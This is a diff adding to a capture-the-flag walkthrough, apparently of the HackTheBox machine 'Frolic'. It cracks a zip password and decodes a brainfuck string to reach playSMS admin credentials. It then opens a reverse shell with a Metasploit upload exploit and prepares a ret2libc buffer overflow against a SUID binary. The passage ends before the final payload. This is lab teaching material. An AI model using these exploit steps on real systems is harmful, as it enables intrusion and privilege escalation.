@@ -63,5 +63,68 @@ UEsDBBQACQAIAMOJN00j/lsUsAAAAGkCAAAJABwAaW5kZXgucGhwVVQJAAOFfKdbhXynW3V4CwABBAAA
 Decoding this gives a weird output to we decide to decode it into a zip file.
 ```base64 -d base64.txt > file.zip```
 Trying to unzip it shows us that it is password protected so we find a tool that can get us the password from it.
+We find a tool called fcrackzip that will do the trick.
+```
+fcrackzip file.zip -u -D -p /usr/share/wordlists/rockyou.txt
+```
+After unzipping that we get a file called index.php that contains a long hex string. We decode this from hex and get a base64 string. After decoding that we get a string that appears to be in the language "brainfuck":
+```
++++++ +++++ [->++ +++++ +++<] >++++ +.--- --.++ +++++ .<+++ [->++ +<]>+
+++.<+ ++[-> ---<] >---- --.-- ----- .<+++ +[->+ +++<] >+++. <+++[ ->---
+<]>-- .<+++ [->++ +<]>+ .---. <+++[ ->--- <]>-- ----. <++++ [->++ ++<]>
+++..<
+```
+Of course we use an online decoder to translate this into english and it ourputs `idkwhatispass` We can only assume that this is the password for the playsms page.
+We login on playsms with `admin:idkwhatispass` 
+We spend a while searching for exploits to gain us a shell, we come accross a metasploit module using searchsploit that will do the trick. Its called `exploit/multi/http/playsms_uploadcsv_exec`
+We set the appropriate options:
+```
+set password idkwhatispass
+set rport 9999
+set rhosts 10.10.10.111
+set targeturi /playsms
+set lhost {your tun0 ip}
+exploit
+```
+We now get a shell as www-data and manage to read the user flag.
+
+# ROOT
+
+We find an SUID binary in /home/ayush/.binary, its called rop
+we run it to see what it does, basically it just takes our input and outputs it. 
+We do:
+```
+./rop AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+And we see that it returns a seg fault so we have a buffer overflow vulnerability.
+We are going to do a ret2libc attack.
+GDB is not installed on the box so we download a static version and then upload it via a metpreter session.
+Theses are the exploitation steps:
+```
+on our box: 
+gdb-peda$ pattern_create -l 100
+'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
+gdb rop
+break *main
+run AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
+c
+we get an address below the line that says segfault.
+gdb-peda$ pattern_offset -q address_we_got
+we will get an offset of 52
+```
+This shows us that the buffer overflows at 52 chars
+Now we need to get all the addresses so we will start with finding the /bin/sh in libc
+```
+www-data@frolic:/home/ayush/.binary$ ldd rop 
+        linux-gate.so.1 =>  (0xb7fda000)
+        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb7e19000)    <-- this!
+        /lib/ld-linux.so.2 (0xb7fdb000)
+        
+www-data@frolic:/home/ayush/.binary$ strings -a -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+ 15ba0b /bin/sh
+Also in gdb we do `p system` and `p exit` to find the addresses for system and exit 
+ ```
+
+
 
 
